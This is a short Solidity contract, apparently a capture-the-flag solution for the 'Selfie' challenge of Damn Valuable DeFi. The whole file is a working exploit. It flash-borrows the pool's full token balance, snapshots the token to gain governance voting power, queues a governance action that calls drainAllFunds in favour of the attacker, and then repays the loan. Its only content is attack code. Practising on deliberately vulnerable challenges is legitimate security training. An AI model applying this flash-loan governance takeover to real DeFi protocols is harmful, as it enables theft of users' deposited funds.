pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";


contract SelfieAttacker {
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    DamnValuableTokenSnapshot public immutable token;
    address public immutable owner;

    constructor(SimpleGovernance _governance, SelfiePool _pool, DamnValuableTokenSnapshot _token) {
        governance = _governance;
        pool = _pool;
        token = _token;
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, ":)");
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address _token, uint256 _amount) external {
        require(msg.sender == address(pool), ":)");
        token.snapshot();
        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
        token.transfer(address(pool), _amount);
    }
}
